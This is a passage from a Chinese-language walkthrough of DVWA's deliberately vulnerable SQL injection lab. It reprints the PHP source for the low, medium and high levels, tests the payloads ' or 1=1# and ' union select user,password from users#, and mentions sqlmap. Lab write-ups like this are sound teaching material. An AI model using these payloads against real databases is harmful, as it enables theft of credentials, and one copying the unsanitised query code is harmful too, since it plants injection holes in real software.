class=\"token string single-quoted-string\">'Caught exception: '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$results</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$results</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t\t\t<span class=\"token comment\">// Get values</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$first</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"first_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$last</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"last_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>ID: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />First name: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$first</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />Surname: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$last</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Error in fetch \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$sqlite_db</span><span class=\"token operator\">-></span><span class=\"token function\">lastErrorMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>发现：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token operator\">...</span><span class=\"token operator\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$first</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"first_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$last</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"last_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>ID: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />First name: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$first</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />Surname: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$last</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现没有进行过滤，利用万能密码 <code>' or 1=1#</code> 试一下：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%25HGPQH%29M%5B%5B949CYZM%5BM%5BZZ4.png\" alt=\"\" /></p>\n<p>利用 <code>' union select user,password from users#</code> 查询数据库其他内容</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/NGO89N7%29%5BUCUN6NGNU1P8UJ.png\" alt=\"\" /></p>\n<h2 id=\"2等级medium-2\"><a class=\"anchor\" href=\"#2等级medium-2\">#</a> 2. 等级：Medium</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Submit'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SQLI_DB'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">MYSQL</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = <span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token comment\">// Get results</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// Display values</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$first</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"first_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$last</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"last_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>ID: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />First name: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$first</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />Surname: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$last</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">SQLITE</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = <span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token comment\">#print $query;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$results</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Caught exception: '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$results</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$results</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t\t\t<span class=\"token comment\">// Get values</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$first</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"first_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$last</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"last_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>ID: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />First name: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$first</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />Surname: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$last</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Error in fetch \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$sqlite_db</span><span class=\"token operator\">-></span><span class=\"token function\">lastErrorMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">// This is used later on in the index.php page</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT COUNT(*) FROM users;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token variable\">$number_of_rows</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_row</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里加入了 <code>mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</code>  进行转义，并且 <code>$id = $_POST[ 'id' ];</code>  变成了 post 方式</p>\n<p>这里直接利用 sqlmap 来进行自动注入</p>\n<p>得到结果：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%6012%5BPC6%7BZMA7D%5BE%24%7D83I%60OS.png\" alt=\"\" /></p>\n<h2 id=\"等级high\"><a class=\"anchor\" href=\"#等级high\">#</a> 等级： <code>high</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_SESSION</span> <span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SQLI_DB'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">MYSQL</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token comment\">// Check database</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' LIMIT 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>Something went wrong.&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token comment\">// Get results</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// Get values</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$first</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"first_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$last</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"last_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td 